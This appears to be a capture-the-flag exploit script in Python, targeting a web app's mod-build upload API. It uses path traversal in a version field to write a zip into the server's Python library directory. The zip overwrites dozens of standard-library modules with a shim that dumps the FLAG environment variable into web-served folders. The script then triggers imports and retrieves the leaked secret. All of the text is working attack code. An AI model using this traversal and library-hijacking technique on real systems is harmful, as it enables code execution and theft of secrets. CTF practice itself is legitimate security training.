#!/usr/bin/env python3
import requests, sys, io, zipfile, secrets, time, re

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://144.79.188.39:42166"
if not BASE.startswith("http"):
    BASE = "http://" + BASE

def fresh():
    u = "u" + secrets.token_hex(4)
    pw = "Pass12345!"
    requests.post(f"{BASE}/api/auth/register/", json={"username": u, "password": pw}, timeout=15)
    r = requests.post(f"{BASE}/api/auth/login/", json={"username": u, "password": pw}, timeout=15)
    return r.json()["access"], u

def H(tok):
    return {"Authorization": f"Bearer {tok}"}

def get_or_create_plat(tok, code, name="z"):
    r = requests.get(f"{BASE}/api/platforms/", headers=H(tok), timeout=15).json()
    for it in (r.get("results", r) if isinstance(r, dict) else r) or []:
        if isinstance(it, dict) and it.get("code") == code:
            return it["id"]
    rp = requests.post(f"{BASE}/api/platforms/", headers=H(tok),
        json={"code": code, "name": name}, timeout=15)
    return rp.json().get("id")

print(f"[*] Target: {BASE}")

OUT = "flag_all_" + secrets.token_hex(4) + ".txt"

SHIM = f"""import os as _os
try:
    with open('/usr/share/nginx/html/{OUT}', 'w') as _f:
        _f.write('FLAG=' + _os.environ.get('FLAG', 'NOFLAG') + '\\n')
except Exception:
    pass
try:
    with open('/data/media/{OUT}', 'w') as _f:
        _f.write('FLAG=' + _os.environ.get('FLAG', 'NOFLAG') + '\\n')
except Exception:
    pass
"""

CANDIDATES = [
    'antigravity', 'bdb', 'cProfile', 'cmd', 'code', 'codeop', 'colorsys',
    'compileall', 'csv', 'doctest', 'filecmp', 'fileinput', 'ftplib', 'getopt',
    'imaplib', 'mailbox', 'modulefinder', 'netrc', 'optparse', 'pdb',
    'pickletools', 'plistlib', 'poplib', 'profile', 'pstats', 'pty',
    'py_compile', 'pyclbr', 'pydoc', 'rlcompleter', 'runpy', 'sched',
    'shelve', 'smtplib', 'sre_compile', 'sre_constants', 'sre_parse',
    'stringprep', 'symtable', 'tabnanny', 'tarfile', 'this', 'timeit',
    'trace', 'tracemalloc', 'tty', 'turtle', 'wave', 'webbrowser', 'zipapp',
    'decimal', 'fractions', 'ipaddress', 'statistics', 'numbers', 'cmath',
    'difflib', 'pprint', 'textwrap', 'gettext', 'calendar', 'keyword',
    'token', 'tokenize', 'ast', 'dis', 'bisect', 'graphlib', 'secrets',
    'getpass', 'cgitb', 'uuid', 'tempfile', 'configparser', 'quopri'
]

print(f"[*] Total candidate modules: {len(CANDIDATES)}")
print(f"[*] Output flag file: {OUT}")

# Step 1: Overwrite all candidates in /usr/local/lib/python3.11/
tok, u = fresh()
pid = get_or_create_plat(tok, "lib/python3.11")
mid = requests.post(f"{BASE}/api/mods/", headers=H(tok),
    json={"title":"z", "mod_version":"../../../usr/local", "release_notes":"", "is_enabled":True}, timeout=15).json()["id"]
bid = requests.post(f"{BASE}/api/mods/{mid}/builds/", headers=H(tok),
    json={"platform": pid}, timeout=15).json()["id"]

bio = io.BytesIO()
with zipfile.ZipFile(bio, 'w', zipfile.ZIP_DEFLATED) as zf:
    for mod in CANDIDATES:
        zf.writestr(f"{mod}.py", f"# Module: {mod}\n{SHIM}")
bio.seek(0)

r = requests.post(f"{BASE}/api/mods/{mid}/builds/{bid}/upload/", headers=H(tok),
    files={"zip_file": ("shotgun.zip", bio, "application/zip")}, timeout=30)
print(f"[*] Shotgun upload status: {r.status_code}")

# Step 2: Trigger endpoints
print("[*] Triggering all endpoints...")
tok_t, _ = fresh()

endpoints = [
    "/api/schema/",
    "/api/schema/?format=json",
    "/api/schema/?format=yaml",
    "/api/docs/",
    "/api/auth/me/",
    "/api/mods/",
    "/api/platforms/",
]

for ep in endpoints:
    try:
        r_ep = requests.get(f"{BASE}{ep}", headers=H(tok_t), timeout=15)
        print(f"  GET {ep} -> {r_ep.status_code}")
    except Exception as e:
        print(f"  ERR {ep}: {e}")

time.sleep(2)

# Step 3: Check for flag
print("\n[*] Checking flag...")
for url, label in [(f"{BASE}/{OUT}", "nginx /"), (f"{BASE}/media/{OUT}", "media /media/")]:
    rf = requests.get(url, timeout=10)
    print(f"  [{label}] status {rf.status_code}: {rf.text[:100] if rf.ok else ''}")
    m = re.search(r"PTITCTF\{[^}]+\}", rf.text)
    if m:
        print(f"\n==========================================")
        print(f">>> FLAG FOUND: {m.group(0)}")
        print(f"==========================================")
        sys.exit(0)
